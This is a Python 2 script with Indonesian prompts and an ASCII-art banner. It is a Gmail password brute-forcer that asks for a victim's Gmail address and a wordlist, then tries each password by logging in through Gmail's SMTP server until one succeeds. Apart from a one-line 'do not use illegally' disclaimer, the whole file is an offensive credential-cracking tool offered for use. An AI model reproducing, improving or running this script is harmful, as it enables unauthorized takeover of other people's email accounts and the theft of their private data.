import smtplib
import os
import datetime
import time

def headers() :
	tampil("\rc.--`                                      `-:.  ")
	tampil("\rc/ooo+/-````````````````````````````````-/ooso+  ")
	tampil("\rc`ooooooo+/.``````````````````````````-/oossssss`")
	tampil("\rc`oooooooooo+:.````````````````````./oossssssssy`")
	tampil("\rc`oosssoooooooo+:.``````````````.:+ossssssosyyyy`")
	tampil("\rc`oooos::+oooooooo+:.````````.:+oooossso+::yyyys`")
	tampil("\rc`ooooo..-:/+oooooooo+:.``.:+ooooooso+:-...yssss`")
	tampil("\rc`ooooo.....-:/+oooooooo++oooooooo+:-...``.sssss`")
	tampil("\rc`ooooo.......--:/+oooooooooooo+/-...`````.sssss`")
	tampil("\rc`sssss...........-:/+oooooo+/:-..````````.sssss`")
	tampil("\rc`sssss..............-:/++/:-...``````````.sssss`")
	tampil("\rc`sssss......................`````````````.sssss`")
	tampil("\rc`sssss............```````````````````````.sssss`")
	tampil("\rc`sssss..........`````````````````````````.sssss`")
	tampil("\rc`sssss.......````````````````````````````.sssss`")
	tampil("\rc`sssss....```````````````````````````````.sssss`")
	tampil("\rc +ssss..`````````````````````````````````.sssso ")
	tampil("\rc `-:::````````````````````````````````````//:-` ")
	print ""
	tampil("\rb           <Copyright by H1D3KUN 2018>          ")
	tampil("\rb                     <v1.0>                     ")
	
def tampil(x) :
	w = {'m':31,'h':32,'k':33,'b':34,'p':35,'c':36}
	for i in w:
		x=x.replace('\r%s'%i,'\033[%s;1m'%w[i])
	x+='\033[0m'
	x=x.replace('\r0','\033[0m')
	print(x)
	
def inputD(x,v=0):
	while 1:
		try:
			a = raw_input('\x1b[33;1m%s\x1b[33;1m : \x1b[36;1m'%x)
		except:
			tampil('\n\rm[!]Batal')
			keluar()
		if v:
			if a.upper() in v:
				break
			else:
				tampil('\rm[!]Masukan Opsinya Bro...')
				continue
		else:
			if len(a) == 0:
				tampil('\rm[!]Masukan dengan benar')
				continue
			else:
				break
	return a

def keluar() :
	waktu = datetime.datetime.now()
	jam = waktu.hour
	menit = waktu.minute
	detik = waktu.second
	tampil('\rmKELUAR')
	time.sleep(1)
	tampil('\rm\nTERIMAKSIH TELAH MENGGUNAKAN TOOLS INI...')
	time.sleep(1)
	print('\033[31;1m\n( SHUTDOWN ) TERAKHIR DI GUNAKAN PADA JAM 	\033[36;1m{0}:{1}:{2}').format(jam,menit,detik)
	time.sleep(5)
	exit()

def brute_login() :
	headers()
	print '\n\033[39;1m###############################################'
	print '\n\n\033[33;1mMemproses ', len(jalankan_sandi), 'Password...'
	time.sleep(5)
	tampil('\rk\nSedang Mengcrack Mohon Tunggu...\n')
	time.sleep(1)
	server_gmail = smtplib.SMTP_SSL('smtp.gmail.com', 465)
	server_gmail.ehlo()
	for password in jalankan_sandi :
		try :
			server_gmail.login(user, password)
			print('\n\033[32;1m[+] Password Telah Ditemukan : \033[33;1m%s' % password)
			keluar()
		except smtplib.SMTPAuthenticationError as e :
			error = str(e)
			if error[14] == "<" :
				print('\n\033[32;1m[+] Password Telah Ditemukan : \033[33;1m%s' % password)
				keluar()
			else :
				print('\033[36;1m[?] Mencoba Password --> %s' % password)
tampil("\rcNote : Jangan gunakan tools ini untuk kebutuhan illegal.")
tampil("\rc       Gunakan aplikasi ini secara bijak ^_^")
user = inputD('\nMasukan Gmail korban')
time.sleep(1)
sandi = inputD('Masukan nama dari password file anda')
try :
	buka_sandi = open(sandi, 'r')
	jalankan_sandi = buka_sandi.readlines()
except IOError :
	tampil("\rm[!] File tidak ditemukan..")
	keluar()
time.sleep(1)
pil = raw_input('\n\n\033[32;1mApakah anda yakin ingin mengcrack akun korban [y/t] ?')
os.system('clear')
if pil == 'y' :
	brute_login()
else :
	keluar()
tampil('\n\rm[!] Maaf tidak ada password yang cocok dalam wordlist anda..!!\n\n\n')
keluar()
